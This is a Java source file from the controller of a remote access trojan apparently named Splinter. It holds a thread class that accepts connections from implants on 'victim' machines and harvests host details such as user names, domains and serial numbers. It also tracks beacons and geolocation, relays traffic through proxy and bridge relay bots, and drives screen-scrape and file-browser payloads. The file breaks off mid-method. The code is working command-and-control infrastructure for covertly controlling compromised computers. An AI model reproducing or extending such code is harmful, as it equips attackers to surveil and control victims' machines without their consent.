/**
 * 
 * @author Solomon Sonya 
 */



package Controller.Thread;


import Controller.GUI.*;
import Controller.Drivers.Drivers;
import GeoLocation.GeoThread;
import GeoLocation.ShowMap;
import Implant.Driver;
import Implant.Splinter_IMPLANT;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.Encoded_File_Transfer.File_Receiver;
import Implant.Payloads.Worker_Thread_Payloads;
import RelayBot.RelayBot_ForwardConnection;
import RelayBot.RelayBot_ServerSocket;
import RunningProcess.*;
import java.io.*;
import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;

import javax.swing.*;
import javax.swing.Timer;

import java.awt.*;
import java.awt.event.*;

public class Thread_Terminal extends Thread implements Runnable, ActionListener
{
	String strMyClassName = "Thread_Terminal";
	
	private Vector<String> vctMyRowData = new Vector<String>();
	
	public volatile LinkedList<File_Receiver>list_file_receivers = null;
	public volatile File_Receiver file_receiver_curr = null;
	
	Frame_RunningProcessList runningProcessFrame = null;
	Node_RunningProcess ndeRunningProcess = null;
	public volatile boolean frameRunningProcessIsDisposed = false;
	
	public RelayBot_ForwardConnection relaybotFowardConnection = null;
	
	public RelayBot_ServerSocket myRelaybot_ServerSocket = null;
	
	
	String fle__isDrive 				=  null;
	String fle__fle 					=  null;
	String fle__driveDisplayName		=  null;
	String fle__isFileSystem			=  null;
	String fle__isFloppy				=  null;
	String fle__isDirectory				=  null;
	String fle__isFile					=  null;
	String fle__isHidden				=  null;
	String fle__isTraversable			=  null;
	String fle__canRead					=  null;
	String fle__canWrite				=  null;
	String fle__canExecute				=  null;
	String fle__fullPath				=  null;
	String fle__parentDirectory			=  null;
	String fle__dateLastModified_long	=  null;
	String fle__totalSpace				=  null;
	String fle__usableSpace				=  null;
	String fle__Size					=  null;
	String fle__upDirectory				=  null;
	public volatile boolean frameFileBrowserIsDisposed = false;
	
	private BufferedReader brIn = null;
	public PrintWriter pwOut = null;
	public Socket sktMyConnection = null;
	
	public volatile boolean dataAcquisitionComplete = false;//used to know if we suppress messages received from client
	public volatile boolean displayMessageInPrivateFrame = false;//used to know if we suppress messages received from client
	
	public static final String WINDOWS_COMMAND_PROMPT_HEADER_STRING = "[Version";//win xp and above
	
	public static final String NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "Copyright (c)"; //LIKE on win 2000 boxes
	public static final String OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "(C) Copyright"; //LIKE on win 2000 boxes
	
	public ArrayList <JPanel_TextDisplayPane> alJtxtpne_PrivatePanes = new ArrayList<JPanel_TextDisplayPane>();//so we know which panes to send our updates to
	
	long myThread_ID = this.getId();
	int myIMPLANT_ID = 0;
	
	
	
	public volatile boolean I_am_Disconnected_From_Implant = false;
	
	public volatile long myRandomIdentifier = 0;
	
	public Thread_Terminal myCareOfAddressNode = null;//this will be the node to send messages through in order to reach this Thread on the victim machine - This should generally be null
	
	GeoThread myGeoLocation = null;
	
	String myLocalControllerPort = "", myLocalController_IP = "", myVictim_RHOST_IP = "", myRemote_RHOST_Port = "";
	
	public String connectedAgentHandshake_BackwardLink_Relay = "";
	
	public String 	I_have_an_important_message = "*",//to state we are still interrogating the system
			
			myCareOfAddress = "  -  ",
			myImplantName = "UNKNOWN",
			myImplantInitialLaunchDirectory = "",
			myBinaryFileName = "UNKNOWN",
			myHostName = "", 
			myOS = "", 
			myOS_Shortcut = "",
			myServicePack = "", 
			myUserName = "", 
			myUserDomain = "",  
			myHomeDrive = "", 
			myProcessorArchitecture = "",
			myCountryCode = "",
			myNumberOfUsers = "",
			myOS_Architecture = "",
			mySerialNumber = "",
			myVersionNumber = "",			
			myNumberOfProcessors = "",
			myOS_Type = "",
			mySystemRoot = "",
			myUserProfile = "",
			myTempPath = "",
			myDisconnectionTime = "",
			myLastConnectionTime = " - ",
			myBeaconInterval = " - ",
			myApproxTimeTilNextBeacon = " - ",
			myConfirmationID_Beacon = "",
			myUniqueDelimiter = "";
			String myChatScreenName = "";
	
	public String myReceivedConfirmationID_From_Implant = "";
			
	public String myCurrentWorkingDirectory = " > ";
	
	public long myCurrentConnectionTime_millis = 1, myDisconnectionTime_millis = 1, myLastConnectionTime_millis = 0;
			
			
	public boolean GEO_RESOLUTION_COMPLETE = false;
	public String 	myFullGeoData = "Resolving...",
					myGEO_IP = "", 
					myGEO_CountryCode = "", 
					myGEO_CountryName = "", 
					myGEO_RegionCode = "", 
					myGEO_RegionName = "", 
					myGEO_City = "", 
					myGEO_Latitude = "", 
					myGEO_Longitude = "", 
					myGEO_MetroCode = "", 
					myGEO_AreaCode = "";
	
	public volatile boolean continueRun = false;
	public volatile boolean killThread = false;
	
	public volatile ArrayList<String> alReceivedLine = new ArrayList<String>();
	public volatile boolean processInterrupt = true; //SEMAPHORE!!!
	public Timer tmrReadLine = null;
	String inputLine = "";
	public volatile boolean closingRunningProcessFrame = false;
	
	public volatile boolean pauseRunningProcessUpdate = false;
	
	public volatile boolean geo_resolution_complete = false;
	
	public volatile Frame_FileBrowser myFileBrowser = null;
	public volatile Object_FileBrowser objFileBrowser = null; 
	public volatile Object_FileBrowser objStartingFileDirectory = null;
	public String []arrObjectData = null;
	
	boolean privateChatMsg = false;
	
	public boolean i_am_Splinter_RAT = false;
	public boolean i_am_NETCAT_Agent = false;
	public boolean i_am_Controller_Agent = false;
	public boolean i_am_Relay_Agent = false;
	public boolean i_am_Beacon_Agent = false;
	public boolean i_am_receiving_beacon_response = false;
	public boolean i_am_loggie_agent = false;
	public boolean i_am_connecting_to_implant = false;
	public boolean i_am_connecting_to_controller = false;
	public boolean i_am_setup_as_relay = false;
	
	public boolean i_have_associated_with_controller = false;
			
	public String relay_Controller_Forward_Address = null;
	public int relay_Controller_Forward_Port = 0;
	
	public boolean relay_mode_BRIDGE = false;
	public boolean relay_mode_PROXY = false;
	
	//
	//Screen Scrape
	//
	public File fleMySaveDirectory = null;
	public File fleMyScreenScrapeDirectory = null;
	public Worker_Thread_Payloads worker_ScreenScrape = null;
	
	public Thread_Terminal(boolean connectingToImplant, boolean connectingToController, boolean connectingToRelay, Socket skt)
	{
		i_am_connecting_to_implant = connectingToImplant;
		i_am_connecting_to_controller = connectingToController;
		i_am_setup_as_relay = connectingToRelay;
		
		
		sktMyConnection = skt;
	}
	
	public void run()
	{
		try
		{
			//Drivers.sop("In thread ID: " + this.getId());
			
			//save the current connection time
			try
			{
				myCurrentConnectionTime_millis = Driver.getTime_Current_Millis();
				myLastConnectionTime = Driver.getTimeStamp_Without_Date();
			}catch(Exception e){Driver.sop("\nCOULD NOT SAVE CURRENT CONNECTION TIME");}
			
			//open streams
			Drivers.sop("In thread: " + myThread_ID + ".  Attempting to open streams on socket...");
			
			//input from implant
			brIn = new BufferedReader(new InputStreamReader(sktMyConnection.getInputStream()));
			
			//output to implant
			pwOut = new PrintWriter(new BufferedOutputStream(sktMyConnection.getOutputStream()));
			
			//Streams opened
			Drivers.sop("Streams opened");
			
			
			
		
			
			//get connection data
			myLocalControllerPort = sktMyConnection.getLocalAddress().toString();
			myLocalController_IP = "" + sktMyConnection.getLocalPort();
			myVictim_RHOST_IP = "" + sktMyConnection.getInetAddress().toString();
			Drivers.sop(sktMyConnection.getInetAddress().toString());
			Drivers.sop(sktMyConnection.getLocalAddress().toString());
			Drivers.sop(sktMyConnection.getLocalSocketAddress().toString());
			myRemote_RHOST_Port = "" + sktMyConnection.getPort();
			
			continueRun = true;
			
			//GeoLocation
			/*try
			{
				if(Driver.enableGPS_Resolution)
				{
					myGeoLocation = new GeoThread(this);
					myGeoLocation.start();
				}
				else
				{
					this.myFullGeoData = "GPS Resolution Disabled";
				}
				
			}catch(Exception e){}*/
			
			//if we are a controller and we're establishing a connection to the next controller, let's the the first to initiate the handshake
			if(this.i_am_connecting_to_controller)
			{
				
				this.pwOut.println(Driver.CONTROLLER_INITIAL_REGISTRATION + Driver.getHandshakeData(Driver.delimeter_1));
				pwOut.flush();
			}
						
			
			//HANDSHAKE
			if(Drivers.acquireAgentOverheadData)
			{
				acquireOverheadData(brIn, pwOut);
				
				//Acquisition complete
				Drivers.sop("Overhead of Data Aquisition complete for this thread ID: " + myThread_ID + ".");
			}
			
			//infinite while loop on any text received from the agent.  this might not be necessary because unlike a chat client, we are connected clients do not spontaneously report data. instead they respond to commands we send to it.  nevertheless, i could have use for this at some time, i'll put it in
			
			/*solution!!!
			Buffer all responses in an arraylist first, (use the while loop to forever listen and buffer for us, )
			then use the timer to pop (remove first) from the arraylist and immediately send to determine command*/
			//myFileBrowser = new Frame_FileBrowser(this);
			//myFileBrowser.setVisible(true);

			/*******************************************
			 * 
			 * Prob for now, if we use our improved 
			 * buffering, working with netcat breaks the entire program, 
			 * so we'll infinite while on netcat for now, and work better 
			 * with our own implants and come back later to fix!
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * 
			 * ******************************************/
			
			if(this.myIMPLANT_ID == Driver.IMPLANT_ID_NETCAT)
			{
				while(continueRun && !this.killThread && !this.sktMyConnection.isClosed() && (!(inputLine = brIn.readLine()).equals(Drivers.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				{
					if(inputLine == null || inputLine.trim().equals(""))
						continue;
					
					//if(dataAcquisitionComplete)
					//{
					//	continue;//do not post received message below
					//}
					
					/******************************
					 * ****************************
					 * LOGG THE RECEIVED LINE
					 ******************************/
					
					//all lines received are from the connected agent sending feedback to the controller
					try	{	Driver.logReceivedLine(true, this.getId(), " " + this.myRandomIdentifier + " ", " " + myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", inputLine);	} catch(Exception ee){}
					
					
					//Driver.sop("Received line in Terminal Thread: " + inputLine);
					//HANDLE SPLINTER IMPLANT SPECIFICALLY
					if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter))
					{
						
						
						if(!determineCommand(inputLine))
						{
							//error on line received, thus display what we received on the main terminals
							postResponse(inputLine);
						}
						continue;
					}
					
					//otherwise, display what we received on the main terminals
					this.postResponse(inputLine);
					
					
					
				}//end while*/
			}
			else
			{
				//REPLACE THE WHILE LOOP WITH A TIMER INTERRUPT TO BE MORE EFFICIENT!!!
				//LET THE THREAD INTERRUPT, IF THERE'S A LINE TO READ, HANDLE IT AND SLEEP. REPEAT.
				//THIS SHOULD PREVENT THE GUI FROM BLOCKING WHEN EVER WE HAVE A LOT OF OLINES BEING READ FROM THE IMPLANT
				
				//start timer to interrupt and read from socket
				if(tmrReadLine != null && tmrReadLine.isRunning())
				{
					try
					{
						tmrReadLine.stop();
					}catch(Exception ee){}
				}
				
				processInterrupt = false;							
				tmrReadLine = new Timer(Driver.THREAD_READLINE_INTERRUPT_INTERVAL_MILLIS, this);
				tmrReadLine.start();
	
				//the thread is started, enter infinite while loop to read everything that comes across the wire and then simply add to the arraylist
				while(continueRun && !this.killThread && !this.sktMyConnection.isClosed() && (!(inputLine = brIn.readLine()).equals(Drivers.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
				{
					if(inputLine == null || inputLine.trim().equals(""))
						continue;
					
					//Driver.sop("4- in " + this.strMyClassName + " Just added cmd to queue: " + inputLine);
								
					//otherwise, add the line to the arraylist to be analyzed by the timer interrupt
					this.alReceivedLine.add(inputLine);
					//Drivers.sop("Size: " + this.alReceivedLine.size());
					
					/******************************
					 * ****************************
					 * LOGG THE RECEIVED LINE
					 ******************************/
					
					//all lines received are from the connected agent sending feedback to the controller
					try	{	Driver.logReceivedLine(true, this.getId(), " " + this.myRandomIdentifier + " ", " " + myImplantName + " ", " SPLINTER - CONTROLER ", " " + this.myVictim_RHOST_IP + " ", " " + Thread_ServerSocket.ControllerIP + " ", inputLine);	} catch(Exception ee){}
					
					
					processInterrupt = true;
				}
				
			}
			
			/*String inputLine = "";
			while(continueRun && !this.sktMyConnection.isClosed() && (!(inputLine = brIn.readLine()).equals(Drivers.DISCONNECT_TOKEN)) && inputLine != null)//listen until agent says disconnect
			{
				if(inputLine == null || inputLine.trim().equals(""))
					continue;
				
				//if(dataAcquisitionComplete)
				//{
				//	continue;//do not post received message below
				//}
				
				//Driver.sop("Received line in Terminal Thread: " + inputLine);
				//HANDLE SPLINTER IMPLANT SPECIFICALLY
				if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter))
				{
					if(!determineCommand(inputLine))
					{
						//error on line received, thus display what we received on the main terminals
						postResponse(inputLine);
					}
					continue;
				}
				
				//otherwise, display what we received on the main terminals
				this.postResponse(inputLine);
				
				
				
			}//end while*/
			
			
			//now must still wait in infinite while to keep thread from terminating!!!
			/*while(this.continueRun)
			{
				//do thing and just wait on the interrupt to process the command!!!
			}*/
			
		}//end try
		catch(Exception e)
		{
			Drivers.sop("\nThread ID [" + myThread_ID + "]: Streams (and socket) are closed for this connection.");
		}
		
		/*********************************************************
		 * 
		 * 
		 * BROKE OUT OF WHILE LOOP, CLEAN SELF AND CLOSE!!!
		 * 
		 * 
		 * *******************************************************/
		
		this.cleanThreadAndClose();
		
		//2013-02-11 SOLO EDIT
		/*//out of while loop, clean and close!
		continueRun = false;
		I_am_Disconnected_From_Implant = true;
		
		myDisconnectionTime = Drivers.getTimeStamp_Without_Date();
		if(myDisconnectionTime == null)
		{
			myDisconnectionTime = "";
		}
		
		//clean the frames if they are indicating a private message!
		try
		{
			for(int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
			{
				this.alJtxtpne_PrivatePanes.get(i).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
			}
			
		}catch(Exception e){}
		
		
		//remove myself from arraylist		
		Drivers.removeThread(this, this.getId());*/
		
		
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == this.tmrReadLine)
			{
				try
				{
					//ensure we're still connected and such
					if(!continueRun || this.killThread || this.sktMyConnection.isClosed())
					{
						//force disconnecion and removal of the thread!
						this.closeThread();
					}
				}
				catch(Exception e){}
				
				if(this.alReceivedLine != null && this.alReceivedLine.size() > 0)
				{
					//Driver.sop("5- in " + this.strMyClassName + " Just added cmd to queue: " + inputLine);
					
					processInterrupt = false;//do not handle additional interrupts until done
					readLineFromSocket();//read the next line from the socket
				}
				
				/*if(this.processInterrupt)
				{
					processInterrupt = false;//do not handle additional interrupts until done
					readLineFromSocket();//read the next line from the socket
				}*/
				
				
			}
			
		}
		catch(Exception e)
		{
			Drivers.eop("AE" , strMyClassName, e, e.getLocalizedMessage(), false);
			
		}
	}
	
	public boolean cleanThreadAndClose()
	{
		try
		{
			
			//out of while loop, clean and close!
			continueRun = false;
			I_am_Disconnected_From_Implant = true;
			
			myDisconnectionTime = Drivers.getTimeStamp_Without_Date();
			
			
			if(myDisconnectionTime == null)
			{
				myDisconnectionTime = "";
			}
			
			//Stop the thread from running
			try
			{
				tmrReadLine.stop();
			}catch(Exception ee){}
			
			//remove forward connection to controller if this is a relay proxy
			if(relay_mode_PROXY)
			{
				Driver.sop("\nBacklink Socket to Agent was severed from Agent Side! - Socket Closed.");
				Driver.sop("Terminating Forwardlink to controller (or next hop) now...");
				try
				{
					if(relaybotFowardConnection != null)
					{											
						try
						{
							relaybotFowardConnection.sktConnection.close();
							Driver.sop("Forwardlink socket closed.");
						}catch(Exception e){}
					}
					else
					{
						
					}
				}catch(Exception e){}
				
				Driver.sop("\n* * * Cleanup complete.\n");
				
			}
			
			if(this.i_am_setup_as_relay)
			{
				//stop here, and PUNT out!
				Driver.removeThread(this, this.getId());
				return true;
			}
			
			
			//clean the frames if they are indicating a private message!
			try
			{
				for(int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
				{
					this.alJtxtpne_PrivatePanes.get(i).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
				}
				
			}catch(Exception e){}
			
			try
			{
				//Clean the Running Process
				if(this.runningProcessFrame != null)
				{
					runningProcessFrame.jlblConnectedAgentInfo.setText("------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
					runningProcessFrame.jlblConnectedAgentInfo.setOpaque(true);
					runningProcessFrame.jlblConnectedAgentInfo.setForeground(Color.yellow);
					runningProcessFrame.jlblConnectedAgentInfo.setBackground(Color.red);
				}
				
			}catch(Exception e){}
			
			try
			{
				
				
				//Clean the File Browser
				if(this.myFileBrowser != null)
				{
					this.myFileBrowser.i_am_connected_to_implant = false;
					this.myFileBrowser.jtblFileBrowser.jlblHeading.setText("------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
					this.myFileBrowser.jtblFileBrowser.jlblHeading.setOpaque(true);
					this.myFileBrowser.jtblFileBrowser.jlblHeading.setForeground(Color.yellow);
					this.myFileBrowser.jtblFileBrowser.jlblHeading.setBackground(Color.red);
				}
				
			}catch(Exception e){}
			
			//
			//logging agent
			//
			try
			{
				if(this.i_am_loggie_agent)
				{
					if(Driver.alLoggingAgents.contains(this))
					{
						Driver.alLoggingAgents.remove(this);
						
						//add to disconnected agents
						Drivers.jtblDisconnectedImplants.addRow(this.getJTableRowData());
						
						this.I_am_Disconnected_From_Implant = true;//ensure it knows it's disconnected
						this.continueRun = false;
						this.killThread = true;
						
						Drivers.jtblLoggingAgents.updateJTable = true;
						
						try		{	this.sktMyConnection.close();			} catch(Exception e){}
					}
					
					return true;
				}
			}
			catch(Exception e)
			{
				Driver.sop("Could not interact with logging agent during thread removal and termination!!!");
			}
			
			
			//remove myself from arraylist		
			Drivers.removeThread(this, this.getId());
			
			//and hopefully, we'll leave this thread to die sloftly...
			
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("cleanThreadAndClose", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean readLineFromSocket()
	{
		try
		{
			/*So far, all attempts to fix this conundrum have been unsuccessful.  therefore, the best approach is to still have
			 * the while loop, except when we receive new lines, immediately add them to an arraylist, 
			 * and then return to the while loop up top.  Then have a separate timer thread that is interrupting to check 
			 * if there are contents in this arraylist, if so, we act upon it, otherwise, we sleep again
			 * 
			 * 
			 * 
			 * 
			 */
			
			if(this.alReceivedLine == null || this.alReceivedLine.size() < 1)
			{
				return false;
			}
			
			//pop the instruction from the stack
			inputLine = this.alReceivedLine.remove(0);
			
			//check if null line is received, this means the implant disconnected from the socket
			if(inputLine == null)
			{
				throw new SocketException("Socket Appears to Be Closed");
			}
			
			if(this.i_am_setup_as_relay && relay_mode_PROXY && !Driver.controller_is_running)
			{
				this.relayMessage_PROXY_FORWARD_LINK(inputLine);
				return true;
			}
			
			else if(this.i_am_setup_as_relay && relay_mode_BRIDGE && !Driver.controller_is_running)
			{
				this.relayMessage_BRIDGE(inputLine);
				return true;
			}
			
			
			if(this.i_am_Beacon_Agent)
			{
				//Driver.sop("Beacon response: " + inputLine);
				
				if(!determineCommand(inputLine))
				{
					//post the response to the beacon log
					Drivers.txtpne_BEACON_broadcastMessageBoard.appendString(true, ""+myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
				}
				
				processInterrupt = true;//release the semaphore
				return true;
			}
			
			//otherwise, pop the first instruction, and send it to determine command
			if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter) || inputLine.startsWith(Driver.SPLINTER_DELIMETER_OPEN))
			{
				
				
				if(!determineCommand(inputLine))//for shortcuts
				{
					//error on line received, thus display what we received on the main terminals
					postResponse(inputLine);
				}
				
				processInterrupt = true;//release the semaphore
				return true;				
			}
												

			//otherwise, display what we received on the main terminals
			this.postResponse(inputLine);				
							
			processInterrupt = true;//release the semaphore
			return true;	
			
			//so we're going to redesign this implementation!
			/*
			 * Before, even if we implement the timer and interrupt, it works perfectly if the socket remains connected, however,  if the socket closes prematurely, this thread never recognizes a disconnection has occured
			 * therefore to fix it, we will still have the timer, however as soon as we come in here, we will then wait on the first line to be read, after we finish processing that line, we'll release the semaphore
			 * this way, we're not just waiting on the br.ready() method, because that never recognizes if the socket is still connected to splinter
			 * 
			 * 
			 * 
			 */
			
			//NOTE: THE SEMAPHORE IS STILL LOCKED AT THIS POINT
			
			//this.processInterrupt = false;
			
			//this.tmrReadLine.stop();
			
			
			//first thing here, we just got here from an interrupt, now wait until we have data on the line. if null is received, the connection was closed and therefore immediately terminate this thread and remove the agent from the arraylist!
			//while((inputLine = brIn.readLine())!= null)
			//{
			//	this.sleep(1000);
			//	Drivers.sop(inputLine);
			//}
						
			/*if(inputLine == null)
			{			
				//if we receive null across the buffer, this is an abrupt termination. distant agent disconnected without warning
				Drivers.sp("  abrupt termination received! Commencing cleaning this thread [" + this.getId() + "] and getting ready to close socket...");
				cleanThreadAndClose();
				return false;
			}
			
			//ensure we're not closing!
			if(inputLine.equals(Drivers.DISCONNECT_TOKEN))
			{
				Drivers.sp("  Disconnection notice received... closing thread [" + this.getId() + "]!!!!");
				cleanThreadAndClose();
				return false;
			}
			
			//otherwise, we're here, we have a good line to process!!!
						
			//Driver.sop("Received line in Terminal Thread: " + inputLine);
			
			//HANDLE SPLINTER IMPLANT SPECIFICALLY
			if(inputLine.trim().startsWith(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION) || inputLine.trim().startsWith(myUniqueDelimiter))
			{
				if(!determineCommand(inputLine))//for shortcuts
				{
					//error on line received, thus display what we received on the main terminals
					postResponse(inputLine);
				}
				
				processInterrupt = true;//release the semaphore
				this.tmrReadLine.start();
				return true;				
			}

			//otherwise, display what we received on the main terminals
			this.postResponse(inputLine);				
							
			processInterrupt = true;//release the semaphore
			this.tmrReadLine.start();
			return true;				
			*/ 
		}
		
		catch(SocketException se)
		{
			Drivers.sop("Socket detected in " + this.strMyClassName + " has returned value expected from a closed socket. Perhaps implant has disconnected abruptly.  Cleaning up thread...");
		}
		
		catch(Exception e)
		{
			Drivers.eop("readLineFromSocket", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		//processInterrupt = true;//release the semaphore
		//this.tmrReadLine.start();
		return false;
	}
	
	public boolean postResponse(String inputLine)
	{
		try
		{
			if(this.i_am_setup_as_relay)
			{
				return false;
			}
			
			//otw, update connected agents as before				
			
		////Determine if we post response in main broadcast frame or if we are to post into private messages
			if(this.alJtxtpne_PrivatePanes != null && this.alJtxtpne_PrivatePanes.size() > 0 && inputLine != null)
			{				
				
				for(int i = 0; i < this.alJtxtpne_PrivatePanes.size(); i++)
				{
					//determine if it is a response to post, or just the current working directory being echoed back to us
					//only update if our current directory is not what is already posted
					try
					{
						//check if the received line contains ":\" or ":/" and ">"
						if(inputLine != null && !inputLine.trim().equals("") && (inputLine.contains(":" + "\\") || inputLine.contains(":" + "/")) && inputLine.trim().endsWith(">") && this.alJtxtpne_PrivatePanes.get(i).myMainControllerWindow != null && !this.alJtxtpne_PrivatePanes.get(i).myMainControllerWindow.jlblTerminalWorkingDirectory.getText().trim().equalsIgnoreCase(inputLine.trim()))
						{
							this.myCurrentWorkingDirectory = " " + inputLine.trim();
							this.alJtxtpne_PrivatePanes.get(i).myMainControllerWindow.jlblTerminalWorkingDirectory.setText(myCurrentWorkingDirectory + " ");
							continue;
							
						}
						else
						{
							//post as before
							this.alJtxtpne_PrivatePanes.get(i).appendString(true, ""+myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
						}
					}
					catch(Exception e)
					{
						//proceed just as before, not sure why an error occurred!
						this.alJtxtpne_PrivatePanes.get(i).appendString(true, ""+myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
					}
					
					
					
				}

			}
			else//post to the main chat window.  No private messages were established
			{
				Drivers.txtpne_broadcastMessageBoard.appendString(true, ""+myThread_ID, inputLine, Drivers.clrImplant, Drivers.clrBackground);
			}

			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("postResponse", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public boolean updateBeaconConnectionTime(String confirmationID)
	{
		try
		{			
			/*Driver.sop("\n\nConfirmation: " + confirmationID);
			Driver.sop("myReceivedConfirmationID_From_Implant: " + myReceivedConfirmationID_From_Implant);
			Driver.sop("myConfirmationID_Beacon: " + myConfirmationID_Beacon + "\n\n");	*/	
			
			Thread_Terminal bcn = Driver.getBeaconThread(myReceivedConfirmationID_From_Implant);
			
			if(bcn == null && !myConfirmationID_Beacon.trim().equals(""))
			{
				Driver.alBeaconTerminals.add(this);		
				//return true;
			}
			
			//ADD ENTRY IF IT DOES NOT EXIST
			/*boolean found = false;
			for(int i = 0; i < Driver.alBeaconTerminals.size(); i++)
			{
				if(Driver.alBeaconTerminals.get(i).myReceivedConfirmationID_From_Implant.trim().equals(confirmationID.trim()))
				{
					found = true;
					break;					
				}
																	
			}
			
			if(!found && !this.myConfirmationID_Beacon.trim().equals(""))
			{
				//not found, so add it here
				Driver.alBeaconTerminals.add(this);
			}*/
											
			//search through all list to find it
			/*if(confirmationID == null || confirmationID.trim().equals(""))
				return false;*/
			
			Thread_Terminal beaconThread = Driver.getBeaconThread(myReceivedConfirmationID_From_Implant);
			
			if(beaconThread == null)
			{
				beaconThread = this;
				//return false;
			}
			
			//long testVal = 1380186484364L;
			long testVal = Driver.getTime_Current_Millis();
			myLastConnectionTime_millis = testVal;
			
			/*Driver.sop("Test setting time for: " + testVal + " -- " + Driver.getTime_Specified_Hyphenated(testVal));			
			Driver.sop("last time: " + beaconThread.myLastConnectionTime_millis + " -- > " + Driver.getTime_Specified_Hyphenated(beaconThread.myLastConnectionTime_millis));
			Driver.sop("current time: " + beaconThread.myCurrentConnectionTime_millis + " -- > " + Driver.getTime_Specified_Hyphenated(beaconThread.myCurrentConnectionTime_millis));
			*/
			
			String interval = Driver.getTimeInterval(Driver.getTime_Current_Millis(), beaconThread.myLastConnectionTime_millis);
			
			if(!interval.equals("00:00:00"))
			{
				beaconThread.myBeaconInterval = interval;
				
				beaconThread.myApproxTimeTilNextBeacon = Driver.getTime_calculateFutureTime_Given_Time_And_Delay(Driver.getTime_Current_Millis(), Math.abs((Driver.getTime_Current_Millis() - beaconThread.myLastConnectionTime_millis)));
			}						
			
			/*if(beaconThread.myLastConnectionTime_millis > 0)
			{
				//
				//Update connection Duration
				//
				//beaconThread.myBeaconInterval = Driver.getTimeInterval(Driver.getTime_Current_Millis(), beaconThread.myLastConnectionTime_millis);
				
				//
				//update time till next approx beacon
				//
				//beaconThread.myApproxTimeTilNextBeacon = Driver.getTime_calculateFutureTime_Given_Time_And_Delay(Driver.getTime_Current_Millis(), Math.abs((Driver.getTime_Current_Millis() - beaconThread.myLastConnectionTime_millis)));
				
			}*/
						
			//
			//Update My Last Connection Time
			//
			/*beaconThread.myLastConnectionTime_millis = this.myCurrentConnectionTime_millis;
			
			beaconThread.myCurrentConnectionTime_millis = Driver.getTime_Current_Millis();
			beaconThread.myLastConnectionTime = Driver.getTimeStamp_Without_Date();*/
			
			beaconThread.myLastConnectionTime_millis = Driver.getTime_Current_Millis();
			
			//check if it is necessary to resolve beacon's GEO Location
			if(!beaconThread.geo_resolution_complete && !myConfirmationID_Beacon.trim().equals(""))
			{
				beaconThread.resolve_GEO_LOCATION();
				
				//Drivers.updateBeaconImplants();
				//Drivers.jtblBeaconImplants.updateJTable = true;
			}
			
			Drivers.updateBeaconImplants();
			Drivers.jtblBeaconImplants.updateJTable = true;
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("updateConnectionTime", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	/**
	 * 
	 * @param line
	 * @return
	 */
	public boolean relayMessage_PROXY_FORWARD_LINK(String line)
	{
		try
		{
			//if our forward connection has failed, we have to re-establish a new connection to proxy it over to the next agent
			if(relaybotFowardConnection == null || !relaybotFowardConnection.connectionEstablished)
			{
				relaybotFowardConnection = new RelayBot_ForwardConnection(this, relay_Controller_Forward_Address, relay_Controller_Forward_Port, connectedAgentHandshake_BackwardLink_Relay);
			}
			else
			{
				//relaybotFowardConnection should be established now, send the message to the forward link
				relaybotFowardConnection.relayMessage_FORWARD(line);
			}
			
			
		}
		catch(Exception e)
		{
			Driver.sop("* * * UNABLE TO RELAY MESSAGE!!! * *");
		}

		return true;
	}
	
	public boolean storeHandShakeData(String handShake)
	{
		try
		{
			if(handShake == null || handShake.trim().equals(""))
			{
				return false;
			}
			
			String [] arrAgent = handShake.split(Driver.delimeter_1);
			
			this.myImplantInitialLaunchDirectory = arrAgent[0]; 
			this.myHostName = arrAgent[1]; 
			this.myOS = arrAgent[2]; 
			this.myOS_Type = arrAgent[3]; 
			this.myUserName = arrAgent[4]; 
			this.myUserDomain = arrAgent[5]; 
			this.myTempPath = arrAgent[6]; 
			this.myUserProfile = arrAgent[7]; 
			this.myProcessorArchitecture = arrAgent[8]; 
			this.myNumberOfProcessors = arrAgent[9]; 
			this.mySystemRoot = arrAgent[10]; 
			
			this.myServicePack = arrAgent[11]; 
			this.myNumberOfUsers = arrAgent[12]; 
			this.mySerialNumber = arrAgent[13];
			this.myOS_Architecture = arrAgent[14];     
			this.myCountryCode = arrAgent[15];       
			this.myVersionNumber = arrAgent[16]; 
			this.myHomeDrive = arrAgent[17]; 		
			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("storeHandshakeData", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
	private boolean determineCommand(String line)
	{
		try
		{			
			
			//Driver.sop("3 - in " + this.strMyClassName + " received line to send to Controller FROM RELAY: " + line);
			
			//Driver.jop("line: " + line);
			
			if(line == null || line.trim().equals(""))
			{
				return false;
			}
										
			/******************************
			 * ****************************
